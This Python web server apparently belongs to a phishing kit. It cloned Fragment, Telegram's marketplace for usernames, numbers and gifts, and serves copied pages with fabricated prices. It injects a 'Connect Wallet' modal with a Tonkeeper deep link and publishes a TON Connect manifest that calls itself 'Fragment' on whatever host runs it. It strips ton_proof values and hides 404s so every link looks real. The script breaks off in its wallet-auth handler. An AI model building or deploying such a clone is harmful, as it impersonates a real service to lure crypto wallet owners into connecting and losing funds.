import http.server
import os
import re
import json
import urllib.parse

VERSION = 598

TON_CONNECT_SCRIPT = """
<style>
#_tc_overlay{display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.6);align-items:flex-end;justify-content:center}
#_tc_overlay.open{display:flex}
@media(min-width:441px){#_tc_overlay{align-items:center}}
#_tc_box{background:#1a2026;border-radius:16px 16px 0 0;padding:24px;width:100%;max-width:440px;text-align:center;position:relative}
@media(min-width:441px){#_tc_box{border-radius:16px}}
#_tc_close{position:absolute;top:16px;right:16px;background:none;border:none;color:#8794a1;font-size:20px;cursor:pointer;line-height:1;padding:4px 8px}
#_tc_title{color:#fff;font-size:20px;font-weight:700;margin:0 0 8px}
#_tc_desc{color:#8794a1;font-size:14px;margin:0 0 20px}
#_tc_qr{width:200px;height:200px;background:#fff;border-radius:12px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;overflow:hidden}
#_tc_qr img{width:100%;height:100%;border-radius:12px}
#_tc_tk{display:block;width:100%;padding:14px;background:#248bda;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;box-sizing:border-box}
#_tc_hint{color:#8794a1;font-size:12px;margin:12px 0 0}
</style>
<div id="_tc_overlay">
  <div id="_tc_box">
    <button id="_tc_close">&#x2715;</button>
    <h2 id="_tc_title">Connect Wallet</h2>
    <p id="_tc_desc">Scan the QR code with your TON wallet app</p>
    <div id="_tc_qr"><img id="_tc_qr_img" src="" alt="QR"/></div>
    <a id="_tc_tk" href="#" target="_blank">Open Tonkeeper</a>
    <p id="_tc_hint">Or open any TON wallet and scan the QR code above</p>
  </div>
</div>
<script>
(function(){
  function makeid(){return Math.random().toString(36).slice(2)+Math.random().toString(36).slice(2)}
  function buildLinks(){
    var origin=location.origin;
    var sid=makeid();
    var r=encodeURIComponent(JSON.stringify({manifestUrl:origin+'/tonconnect-manifest.json'}));
    return{
      tc:'tc://v1/?id='+sid+'&r='+r+'&ret=back',
      tk:'https://app.tonkeeper.com/ton-connect?v=2&id='+sid+'&r='+r+'&ret=back'
    };
  }
  function openModal(){
    var links=buildLinks();
    var qrUrl='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(links.tc);
    document.getElementById('_tc_qr_img').src=qrUrl;
    document.getElementById('_tc_tk').href=links.tk;
    document.getElementById('_tc_overlay').classList.add('open');
    document.body.style.overflow='hidden';
  }
  function closeModal(){
    document.getElementById('_tc_overlay').classList.remove('open');
    document.body.style.overflow='';
  }
  document.getElementById('_tc_close').addEventListener('click',closeModal);
  document.getElementById('_tc_overlay').addEventListener('click',function(e){if(e.target===this)closeModal();});
  document.addEventListener('click',function(e){
    var el=e.target;
    while(el&&el!==document){
      if(el.classList&&(el.classList.contains('ton-auth-link')||el.classList.contains('js-btn-tonkeeper'))){
        e.stopPropagation();e.preventDefault();
        openModal();return;
      }
      el=el.parentNode;
    }
  },true);
})();
</script>
"""

# Collection slug → singular display name (strip trailing 's' for singular form)
GIFT_COLLECTIONS = {
    "artisanbrick": "Artisan Brick",
    "astralshard": "Astral Shard",
    "bdaycandle": "B-Day Candle",
    "berrybox": "Berry Box",
    "bigyear": "Big Year",
    "blingbinky": "Bling Binky",
    "bondedring": "Bonded Ring",
    "bowtie": "Bow Tie",
    "bunnymuffin": "Bunny Muffin",
    "candycane": "Candy Cane",
    "chillflame": "Chill Flame",
    "cloverpin": "Clover Pin",
    "cookieheart": "Cookie Heart",
    "crystalball": "Crystal Ball",
    "cupidcharm": "Cupid Charm",
    "deskcalendar": "Desk Calendar",
    "diamondring": "Diamond Ring",
    "durovscap": "Durov's Cap",
    "easteregg": "Easter Egg",
    "electricskull": "Electric Skull",
    "eternalcandle": "Eternal Candle",
    "eternalrose": "Eternal Rose",
    "evileye": "Evil Eye",
    "faithamulet": "Faith Amulet",
    "flyingbroom": "Flying Broom",
    "freshsocks": "Fresh Socks",
    "gemsignet": "Gem Signet",
    "genielamp": "Genie Lamp",
    "gingercookie": "Ginger Cookie",
    "hangingstar": "Hanging Star",
    "happybrownie": "Happy Brownie",
    "heartlocket": "Heart Locket",
    "heroichelmet": "Heroic Helmet",
    "hexpot": "Hex Pot",
    "holidaydrink": "Holiday Drink",
    "homemadecake": "Homemade Cake",
    "hypnolollipop": "Hypno Lollipop",
    "icecream": "Ice Cream",
    "inputkey": "Input Key",
    "instantramen": "Instant Ramen",
    "iongem": "Ion Gem",
    "ionicdryer": "Ionic Dryer",
    "jackinthebox": "Jack-in-the-Box",
    "jellybunny": "Jelly Bunny",
    "jesterhat": "Jester Hat",
    "jinglebells": "Jingle Bells",
    "jollychimp": "Jolly Chimp",
    "joyfulbundle": "Joyful Bundle",
    "khabibspapakha": "Khabib's Papakha",
    "kissedfrog": "Kissed Frog",
    "lightsword": "Light Sword",
    "lolpop": "Lol Pop",
    "lootbag": "Loot Bag",
    "lovecandle": "Love Candle",
    "lovepotion": "Love Potion",
    "lowrider": "Low Rider",
    "lunarsnake": "Lunar Snake",
    "lushbouquet": "Lush Bouquet",
    "madpumpkin": "Mad Pumpkin",
    "magicpotion": "Magic Potion",
    "mightyarm": "Mighty Arm",
    "minioscar": "Mini Oscar",
    "moneypot": "Money Pot",
    "moodpack": "Mood Pack",
    "moonpendant": "Moon Pendant",
    "moussecake": "Mousse Cake",
    "nailbracelet": "Nail Bracelet",
    "nekohelmet": "Neko Helmet",
    "partysparkler": "Party Sparkler",
    "perfumebottle": "Perfume Bottle",
    "petsnake": "Pet Snake",
    "plushpepe": "Plush Pepe",
    "poolfloat": "Pool Float",
    "preciouspeach": "Precious Peach",
    "prettyposy": "Pretty Posy",
    "rarebird": "Rare Bird",
    "recordplayer": "Record Player",
    "restlessjar": "Restless Jar",
    "sakuraflower": "Sakura Flower",
    "santahat": "Santa Hat",
    "scaredcat": "Scared Cat",
    "sharptongue": "Sharp Tongue",
    "signetring": "Signet Ring",
    "skullflower": "Skull Flower",
    "skystilettos": "Sky Stilettos",
    "sleighbell": "Sleigh Bell",
    "snakebox": "Snake Box",
    "snoopcigar": "Snoop Cigar",
    "snoopdogg": "Snoop Dogg",
    "snowglobe": "Snow Globe",
    "snowmittens": "Snow Mittens",
    "spicedwine": "Spiced Wine",
    "springbasket": "Spring Basket",
    "spyagaric": "Spy Agaric",
    "starnotepad": "Star Notepad",
    "stellarrocket": "Stellar Rocket",
    "swagbag": "Swag Bag",
    "swisswatch": "Swiss Watch",
    "tamagadget": "Tama Gadget",
    "timelessbook": "Timeless Book",
    "tophat": "Top Hat",
    "toybear": "Toy Bear",
    "trappedheart": "Trapped Heart",
    "ufcstrike": "UFC Strike",
    "valentinebox": "Valentine Box",
    "vicecream": "Vice Cream",
    "victorymedal": "Victory Medal",
    "vintagecigar": "Vintage Cigar",
    "voodoodoll": "Voodoo Doll",
    "westsidesign": "Westside Sign",
    "whipcupcake": "Whip Cupcake",
    "winterwreath": "Winter Wreath",
    "witchhat": "Witch Hat",
    "xmasstocking": "Xmas Stocking",
}


TON_RATE = 1.9653  # TON → USD


def gen_price(seed_str, base, lo=0.35, hi=1.8):
    """Deterministic pseudo-random price based on seed string."""
    h = 5381
    for c in str(seed_str):
        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    factor = lo + ((h % 10000) / 10000.0) * (hi - lo)
    price = max(50, int(base * factor))
    if price >= 50000:
        price = round(price / 5000) * 5000
    elif price >= 10000:
        price = round(price / 1000) * 1000
    elif price >= 1000:
        price = round(price / 100) * 100
    elif price >= 200:
        price = round(price / 50) * 50
    else:
        price = round(price / 10) * 10
    return price


def fmt_ton(n):
    """12500 → '12,500'"""
    return f"{n:,}"


def fmt_usd(ton):
    usd = ton * TON_RATE
    if usd >= 1000:
        return f"~ ${usd:,.0f}"
    return f"~ ${usd:.0f}"


def format_number_display(number_id):
    """Convert '88800001312' → '+888 0000 1312'"""
    digits = str(number_id)
    if digits.startswith("888") and len(digits) >= 11:
        mid = digits[3:7]
        end = digits[7:11]
        return f"+888 {mid} {end}"
    return f"+{digits}"


def gift_slug_to_title(slug):
    """Convert 'plushpepe-1821' → 'Plush Pepe #1821'"""
    parts = slug.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        collection_slug = parts[0]
        number = parts[1]
        collection_name = GIFT_COLLECTIONS.get(collection_slug)
        if not collection_name:
            # Fallback: title-case the slug
            collection_name = collection_slug.title()
        return f"{collection_name} #{number}"
    return slug.replace("-", " ").title()


def apply_dynamic_replacements(content, replacements):
    """Apply a list of (old, new) replacements to content."""
    for old, new in replacements:
        content = content.replace(old, new)
    return content

NEW_MENU_WINDOW_HTML = """<div class="tm-header-menu-window js-header-menu-window">
      <!-- DISCONNECTED STATE -->
      <div class="tm-wallet-menu-disconnected">
       <div class="tm-header-menu-body">
        <h4 class="tm-menu-subheader">Platform</h4>
        <div class="tm-menu-links">
         <a class="tm-menu-link icon-before icon-menu-about" href="/about">About</a>
         <a class="tm-menu-link icon-before icon-menu-terms" href="/terms">Terms</a>
         <a class="tm-menu-link icon-before icon-menu-privacy" href="/privacy">Privacy Policy</a>
        </div>
        <div class="tm-header-menu-footer">
         <div class="tm-header-menu-footer-text">Connect TON and Telegram<br/>to view your bids and assets</div>
         <button class="btn btn-primary btn-block tm-menu-button ton-auth-link">
          <i class="icon icon-connect-ton"></i>
          <span class="tm-button-label">Connect TON</span>
         </button>
         <button class="btn btn-default btn-block tm-menu-button login-link">
          <i class="icon icon-connect-telegram"></i>
          <span class="tm-button-label">Connect Telegram</span>
         </button>
        </div>
       </div>
      </div>
      <!-- CONNECTED STATE -->
      <div class="tm-wallet-menu-connected" style="display:none;">
       <div class="tm-header-menu-body">
        <div style="padding:20px 12px 16px;border-bottom:1px solid var(--separator-color,rgba(255,255,255,.08));margin-bottom:4px;">
         <div class="tm-menu-account-address tm-wallet-menu-addr" style="font-size:16px;"></div>
         <div class="tm-menu-account-desc">Connected TON wallet</div>
        </div>
        <h4 class="tm-menu-subheader" style="margin-top:16px;">My Account</h4>
        <div class="tm-menu-links">
         <a class="tm-menu-link icon-before icon-menu-profile" href="/me">My Profile</a>
         <a class="tm-menu-link icon-before icon-menu-assets" href="/me">My Assets</a>
         <a class="tm-menu-link icon-before icon-menu-bids" href="/me">My Bids</a>
         <a class="tm-menu-link icon-before icon-menu-numbers" href="/me">My Collectible Numbers</a>
         <a class="tm-menu-link icon-before icon-menu-convert" href="/me">Convert to Collectibles</a>
         <a class="tm-menu-link icon-before icon-menu-sessions" href="/me">Active Sessions</a>
         <a class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link" href="#">Disconnect TON</a>
        </div>
        <h4 class="tm-menu-subheader" style="margin-top:8px;">Platform</h4>
        <div class="tm-menu-links">
         <a class="tm-menu-link icon-before icon-menu-about" href="/about">About</a>
         <a class="tm-menu-link icon-before icon-menu-terms" href="/terms">Terms</a>
         <a class="tm-menu-link icon-before icon-menu-privacy" href="/privacy">Privacy Policy</a>
        </div>
       </div>
      </div>
     </div>"""


def transform_menu(content):
    """Replace old static menu window with connected/disconnected states in every page."""
    start_tag = '<div class="tm-header-menu-window js-header-menu-window">'
    idx = content.find(start_tag)
    if idx == -1:
        return content
    pos = idx + len(start_tag)
    depth = 1
    while pos < len(content) and depth > 0:
        open_pos = content.find('<div', pos)
        close_pos = content.find('</div>', pos)
        if close_pos == -1:
            break
        if open_pos != -1 and open_pos < close_pos:
            depth += 1
            pos = open_pos + 4
        else:
            depth -= 1
            pos = close_pos + 6
    content = content[:idx] + NEW_MENU_WINDOW_HTML + content[pos:]
    return content


PAGE_ROUTES = {
    "/": "index.html",
    "/numbers": "html/page_2.html",
    "/gifts": "html/page_3.html",
    "/stars": "html/page_4.html",
    "/premium": "html/page_5.html",
    "/ads": "html/page_6.html",
    "/html/numbers.html": "html/page_2.html",
    "/html/gifts.html": "html/page_3.html",
    "/html/stars.html": "html/page_4.html",
    "/html/premium.html": "html/page_5.html",
    "/html/ads.html": "html/page_6.html",
    "/html/about.html": "html/page_7.html",
    "/html/terms.html": "html/page_8.html",
    "/html/privacy.html": "html/page_9.html",
    "/html/ccccc.html": "html/page_17.html",
    "/html/president.html": "html/page_18.html",
    "/about": "html/page_7.html",
    "/terms": "html/page_8.html",
    "/privacy": "html/page_9.html",
    "/stars/buy": "html/page_4.html",
    "/stars/giveaway": "html/page_4.html",
}

SORT_FILTER_PAGES = {
    ("price", "auction"):      "html/page_10.html",
    ("price_desc", "auction"): "html/page_10.html",
    ("price", "sold"):         "html/page_11.html",
    ("price_desc", "sold"):    "html/page_11.html",
    ("price", "sale"):         "html/page_12.html",
    ("price_desc", "sale"):    "html/page_12.html",
    ("price_desc", ""):        "html/page_13.html",
    ("price_asc", ""):         "html/page_14.html",
    ("price_asc", "auction"):  "html/page_14.html",
    ("price_asc", "sold"):     "html/page_14.html",
    ("price_asc", "sale"):     "html/page_14.html",
    ("listed", ""):            "html/page_15.html",
    ("listed", "auction"):     "html/page_15.html",
    ("listed", "sold"):        "html/page_15.html",
    ("listed", "sale"):        "html/page_15.html",
    ("ending", ""):            "html/page_16.html",
    ("ending", "auction"):     "html/page_16.html",
    ("ending", "sold"):        "html/page_16.html",
    ("ending", "sale"):        "html/page_16.html",
}

MIME_TYPES = {
    ".html": "text/html; charset=utf-8",
    ".css":  "text/css",
    ".js":   "application/javascript",
    ".jpg":  "image/jpeg",
    ".jpeg": "image/jpeg",
    ".png":  "image/png",
    ".webp": "image/webp",
    ".ico":  "image/x-icon",
    ".svg":  "image/svg+xml",
    ".woff": "font/woff",
    ".woff2":"font/woff2",
    ".ttf":  "font/ttf",
    ".zip":  "application/zip",
    ".json": "application/json",
    ".gif":  "image/gif",
    ".mp4":  "video/mp4",
    ".txt":  "text/plain",
}

_page_cache = {}


def extract_aj_content(content):
    """Extract the innerHTML of #aj_content div."""
    start_marker = 'id="aj_content"'
    start_idx = content.find(start_marker)
    if start_idx == -1:
        start_marker = "id='aj_content'"
        start_idx = content.find(start_marker)
    if start_idx == -1:
        return ""

    div_open_end = content.find(">", start_idx) + 1
    depth = 1
    pos = div_open_end
    while depth > 0 and pos < len(content):
        next_open = content.find("<div", pos)
        next_close = content.find("</div>", pos)
        if next_close == -1:
            break
        if next_open != -1 and next_open < next_close:
            depth += 1
            pos = next_open + 4
        else:
            depth -= 1
            if depth == 0:
                return content[div_open_end:next_close]
            pos = next_close + 6
    return ""


def extract_aj_script(content):
    """Extract content of <script id="aj_script"> block."""
    m = re.search(r'<script[^>]+id=["\']aj_script["\'][^>]*>(.*?)</script>',
                  content, re.DOTALL)
    if m:
        script = m.group(1)
        # Remove the old ton_proof so wallet stays connected
        script = re.sub(
            r'"ton_proof"\s*:\s*"[^"]*"',
            '"ton_proof":""',
            script
        )
        return script.strip()
    return ""


def strip_scripts_from_html(html):
    """Remove all <script> tags from HTML (both inline and external)."""
    # Remove external scripts: <script src="..."></script>
    html = re.sub(r'<script[^>]+src=[^>]+>\s*</script>', '', html, flags=re.DOTALL)
    # Remove script blocks that contain ajInit(...) — these cause re-init
    html = re.sub(r'<script(?![^>]+id=["\']aj_script["\'])[^>]*>\s*ajInit\s*\(.*?\)\s*;?\s*</script>',
                  '', html, flags=re.DOTALL)
    # Remove <script id="aj_script">...</script> — will be sent as j field
    html = re.sub(r'<script[^>]+id=["\']aj_script["\'][^>]*>.*?</script>',
                  '', html, flags=re.DOTALL)
    # Remove any remaining inline scripts that contain ajInit
    html = re.sub(r'<script[^>]*>(?:[^<]|<(?!/script))*ajInit\s*\((?:[^<]|<(?!/script))*</script>',
                  '', html, flags=re.DOTALL)
    # Remove Cloudflare beacon scripts
    html = re.sub(r'<script[^>]+data-cf-beacon[^>]*>.*?</script>', '', html, flags=re.DOTALL)
    # Remove tc-widget-root (TON Connect widget — already on main page)
    html = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', html, flags=re.DOTALL)
    return html


def extract_search_html(content):
    """Extract .js-search-results section."""
    sr_marker = 'class="tm-section clearfix js-search-results"'
    sr_idx = content.find(sr_marker)
    if sr_idx == -1:
        sr_marker = "js-search-results"
        sr_idx = content.find(sr_marker)
    if sr_idx == -1:
        return ""

    sec_start = content.rfind("<", 0, sr_idx)
    sec_open_end = content.find(">", sec_start) + 1
    depth = 1
    pos = sec_open_end
    tag_name = "section"
    while depth > 0 and pos < len(content):
        next_open = content.find(f"<{tag_name}", pos)
        next_close = content.find(f"</{tag_name}>", pos)
        if next_close == -1:
            break
        if next_open != -1 and next_open < next_close:
            depth += 1
            pos = next_open + len(tag_name) + 1
        else:
            depth -= 1
            if depth == 0:
                return content[sec_start:next_close + len(tag_name) + 3]
            pos = next_close + len(tag_name) + 3
    return ""


def parse_page(filepath):
    if filepath in _page_cache:
        return _page_cache[filepath]

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    title_match = re.search(r"<title[^>]*>\s*(.*?)\s*</title>", content, re.DOTALL)
    title = title_match.group(1).strip() if title_match else "Fragment"

    rc_match = re.search(r'<html[^>]*class=["\']([^"\']*)["\']', content)
    rc = rc_match.group(1) if rc_match else ""

    raw_aj_html = extract_aj_content(content)
    aj_script = extract_aj_script(content)
    aj_html = strip_scripts_from_html(raw_aj_html)
    search_html = extract_search_html(content)

    result = {
        "title": title,
        "rc": rc,
        "aj_html": aj_html,
        "aj_script": aj_script,
        "search_html": search_html,
    }
    _page_cache[filepath] = result
    return result


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def send_full_page(self, file_path):
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        # Fix ton_proof in full page loads too
        content = re.sub(r'"ton_proof"\s*:\s*"[^"]*"', '"ton_proof":""', content)
        if "<base " not in content:
            content = content.replace("<head>", '<head>\n  <base href="/">', 1)
            if '<base href="/">' not in content:
                content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
        # Remove tc-widget-root (TON Connect widget container)
        content = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', content, flags=re.DOTALL)
        # Remove any inline script that contains duplicate .ton-auth-link click handler
        content = re.sub(r'<script[^>]*>(?:(?!</script>).)*?closest\s*\(\s*["\']\.ton-auth-link["\'](?:(?!</script>).)*?</script>', '', content, flags=re.DOTALL)
        # Apply unified connected/disconnected menu structure to all pages
        content = transform_menu(content)
        data = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.end_headers()
        self.wfile.write(data)

    def send_json(self, obj):
        data = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def send_empty_ok(self, mime="image/png"):
        # Minimal 1x1 transparent PNG
        png_1x1 = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
            b'\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
            b'\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(png_1x1)))
        self.send_header("Cache-Control", "public, max-age=86400")
        self.end_headers()
        self.wfile.write(png_1x1)

    def build_ajax_response(self, file_path):
        page = parse_page(file_path)
        resp = {
            "v": VERSION,
            "h": page["aj_html"],
            "t": page["title"],
            "rc": page["rc"],
        }
        if page["aj_script"]:
            resp["j"] = page["aj_script"]
        return resp

    def send_dynamic_page(self, content):
        """Send pre-generated dynamic HTML content."""
        content = re.sub(r'"ton_proof"\s*:\s*"[^"]*"', '"ton_proof":""', content)
        if "<base " not in content:
            content = content.replace("<head>", '<head>\n  <base href="/">', 1)
            if '<base href="/">' not in content:
                content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
        content = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', content, flags=re.DOTALL)
        content = re.sub(r'<script[^>]*>(?:(?!</script>).)*?closest\s*\(\s*["\']\.ton-auth-link["\'](?:(?!</script>).)*?</script>', '', content, flags=re.DOTALL)
        content = transform_menu(content)
        data = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.end_headers()
        self.wfile.write(data)

    def build_ajax_dynamic(self, content):
        """Build AJAX JSON response from pre-generated dynamic HTML."""
        title_match = re.search(r"<title[^>]*>\s*(.*?)\s*</title>", content, re.DOTALL)
        title = title_match.group(1).strip() if title_match else "Fragment"
        rc_match = re.search(r'<html[^>]*class=["\']([^"\']*)["\']', content)
        rc = rc_match.group(1) if rc_match else ""
        raw_aj_html = extract_aj_content(content)
        aj_script = extract_aj_script(content)
        aj_html = strip_scripts_from_html(raw_aj_html)
        resp = {"v": VERSION, "h": aj_html, "t": title, "rc": rc}
        if aj_script:
            resp["j"] = aj_script
        return resp

    def serve_content(self, content, is_ajax):
        """Serve pre-generated HTML content as full page or AJAX."""
        if is_ajax:
            try:
                self.send_json(self.build_ajax_dynamic(content))
            except Exception:
                self.send_dynamic_page(content)
        else:
            self.send_dynamic_page(content)

    def do_GET(self):
        raw_path = self.path.split("?")[0]
        path = raw_path
        is_ajax = bool(self.headers.get("X-Aj-Referer"))

        # tonconnect manifest — serve with dynamic URL matching the real host
        if path == "/tonconnect-manifest.json":
            host = self.headers.get("Host", "")
            scheme = "https" if host and not host.startswith("localhost") else "http"
            origin = f"{scheme}://{host}" if host else "http://localhost:5000"
            manifest = {
                "url": origin,
                "name": "Fragment",
                "iconUrl": f"{origin}/img/fragment_icon.svg",
                "termsOfUseUrl": f"{origin}/terms",
                "privacyPolicyUrl": f"{origin}/privacy"
            }
            data = json.dumps(manifest, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data)
            return

        path_ext = os.path.splitext(path)[1].lower()

        # Static files that exist on disk (CSS, JS, images, fonts…)
        static_path = path.lstrip("/")
        if static_path and os.path.isfile(static_path):
            mime = MIME_TYPES.get(path_ext, "application/octet-stream")
            with open(static_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", mime)
            self.send_header("Content-Length", str(len(data)))
            if path_ext in (".js", ".css"):
                self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
                self.send_header("Pragma", "no-cache")
            else:
                self.send_header("Cache-Control", "public, max-age=86400")
            self.end_headers()
            self.wfile.write(data)
            return

        # Named page routes
        file_path = PAGE_ROUTES.get(path)

        # Any /html/*.html not explicitly mapped → generic product page
        if file_path is None and path.startswith("/html/") and path.endswith(".html"):
            file_path = "html/page_17.html"

        # /number/ID → dynamic number product page
        if file_path is None and path.startswith("/number/"):
            number_id = path[len("/number/"):].strip("/")
            tpl = "html/page_number.html" if os.path.isfile("html/page_number.html") else "html/page_17.html"
            with open(tpl, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            display = format_number_display(number_id)
            num_price = gen_price(number_id, 5000)
            num_hist  = gen_price(number_id + "_h", 4000)
            content = apply_dynamic_replacements(content, [
                ("+88800001312",         f"+{number_id}"),
                ("88800001312",          number_id),
                ("+888 0000 1312",       display),
                ("ccccc \u2013\xa0Fragment", f"{display} \u2013\xa0Fragment"),
                ("ccccc \u2013 Fragment",    f"{display} \u2013 Fragment"),
                ("ccccc – Fragment",         f"{display} – Fragment"),
                ("7,455",                fmt_ton(num_price)),
                ("~ $14,661",            fmt_usd(num_price)),
                ("7,100",                fmt_ton(num_hist)),
            ])
            self.serve_content(content, is_ajax)
            return

        # /gifts/collection → gifts listing filtered by collection
        if file_path is None and re.match(r'^/gifts/[^/]+$', path):
            file_path = "html/page_3.html"

        # /gift/slug or /gifts/collection/slug → dynamic gift product page
        if file_path is None and (re.match(r'^/gift/', path) or re.match(r'^/gifts/[^/]+/.+', path)):
            # Extract gift slug from the URL
            m = re.match(r'^/gift/([^/?]+)', path)
            if not m:
                m = re.match(r'^/gifts/[^/]+/([^/?]+)', path)
            gift_slug = m.group(1) if m else "plushpepe-1821"
            title = gift_slug_to_title(gift_slug)
            tpl = "html/page_gift.html" if os.path.isfile("html/page_gift.html") else "html/page_17.html"
            with open(tpl, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            gift_price = gen_price(gift_slug, 900)
            gift_hist  = gen_price(gift_slug + "_h", 700)
            content = apply_dynamic_replacements(content, [
                ("plushpepe-1821",   gift_slug),
                ("Plush Pepe #1821", title),
                ("/images/plushpepe-1821.medium.jpg", f"/images/{gift_slug}.medium.jpg"),
                ("ccccc \u2013\xa0Fragment", f"{title} \u2013\xa0Fragment"),
                ("ccccc \u2013 Fragment",    f"{title} \u2013 Fragment"),
                ("ccccc – Fragment",         f"{title} – Fragment"),
                ("1,312",            fmt_ton(gift_price)),
                ("~ $2,580",         fmt_usd(gift_price)),
                ("1,250",            fmt_ton(gift_hist)),
            ])
            self.serve_content(content, is_ajax)
            return

        # /me → profile page
        if file_path is None and path == "/me":
            file_path = "html/page_me.html"

        # /username slugs → dynamic username product page
        if file_path is None and re.match(r'^/[a-zA-Z0-9_]+$', path):
            username = path.lstrip("/")
            # First check if there is a dedicated page mapped via /html/{username}.html
            html_route_key = f"/html/{username}.html"
            if html_route_key in PAGE_ROUTES:
                file_path = PAGE_ROUTES[html_route_key]
            else:
                candidate = f"html/{username}.html"
                if os.path.isfile(candidate):
                    file_path = candidate
                else:
                    tpl = "html/page_17.html"
                    with open(tpl, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    high_bid  = gen_price(username, 20000)
                    bid_step  = max(100, round(high_bid * 0.05 / 100) * 100)
                    min_bid   = high_bid + bid_step
                    content = apply_dynamic_replacements(content, [
                        ("ccccc",          username),
                        ("52,500",         fmt_ton(high_bid)),
                        ("~ $103,247",     fmt_usd(high_bid)),
                        ("2,625",          fmt_ton(bid_step)),
                        ("55,125",         fmt_ton(min_bid)),
                        ("~ $108,410",     fmt_usd(min_bid)),
                        ('"55125"',        f'"{min_bid}"'),
                        ("value=\"55125\"", f"value=\"{min_bid}\""),
                    ])
                    self.serve_content(content, is_ajax)
                    return

        if file_path:
            if is_ajax:
                try:
                    self.send_json(self.build_ajax_response(file_path))
                except Exception:
                    self.send_full_page(file_path)
            else:
                self.send_full_page(file_path)
            return

        # Missing images / icons → return 1×1 transparent PNG (no 404)
        img_exts = {".ico", ".svg", ".png", ".jpg", ".jpeg", ".gif", ".webp"}
        if path_ext in img_exts:
            self.send_empty_ok(MIME_TYPES.get(path_ext, "image/png"))
            return

        # Missing fonts → empty 200
        font_exts = {".woff", ".woff2", ".ttf"}
        if path_ext in font_exts:
            self.send_response(200)
            self.send_header("Content-Type", MIME_TYPES.get(path_ext, "font/woff2"))
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        # Catch-all: never show a 404 page
        if is_ajax:
            try:
                self.send_json(self.build_ajax_response("index.html"))
            except Exception:
                self.send_full_page("index.html")
        else:
            self.send_full_page("index.html")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Aj-Referer")
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        params = urllib.parse.parse_qs(body)
        method = params.get("method", [""])[0]

        if method == "searchAuctions":
            # Load-more (pagination) requests — return empty to stop infinite loop
            offset_id = params.get("offset_id", [""])[0]
            if offset_id:
                self.send_json({"ok": 1, "part": 1, "body": "", "foot": ""})
                return

            sort_val   = params.get("sort",   ["price_desc"])[0]
            filter_val = params.get("filter", [""])[0]

            # Detect section from Referer header so gifts/numbers stay in their section
            referer = self.headers.get("Referer", "") or self.headers.get("X-Aj-Referer", "")
            referer_path = urllib.parse.urlparse(referer).path if referer else "/"

            parts = []
            if sort_val:
                parts.append(f"sort={sort_val}")
            if filter_val:
                parts.append(f"filter={filter_val}")
            qs = ("?" + "&".join(parts)) if parts else ""

            if referer_path.startswith("/gifts"):
                page_file = "html/page_3.html"
                url = "/gifts" + qs
            elif referer_path.startswith("/numbers"):
                page_file = "html/page_2.html"
                url = "/numbers" + qs
            else:
                page_file = SORT_FILTER_PAGES.get((sort_val, filter_val))
                if not page_file:
                    page_file = SORT_FILTER_PAGES.get((sort_val, "auction"))
                if not page_file:
                    page_file = "html/page_13.html"
                url = "/" + qs

            try:
                page = parse_page(page_file)
                self.send_json({
                    "ok": 1,
                    "html": page["search_html"],
                    "url": url,
                    "expire": 9999999999,
                })
            except Exception as e:
                self.send_json({"ok": 0, "error": str(e)})
            return

        if method == "getTonAuthLink":
            host = self.headers.get("Host", "")
            scheme = "https" if host and not host.startswith("localhost") else "http"
            origin = f"{scheme}://{host}" if host else "http://localhost:5000"
            import base64, time, secrets
            payload = base64.urlsafe_b64encode(secrets.token_bytes(16)).rstrip(b"=").decode()
            ret = base64.urlsafe_b64encode(origin.encode()).rstrip(b"=").decode()
            manifest = base64.urlsafe_b64encode(
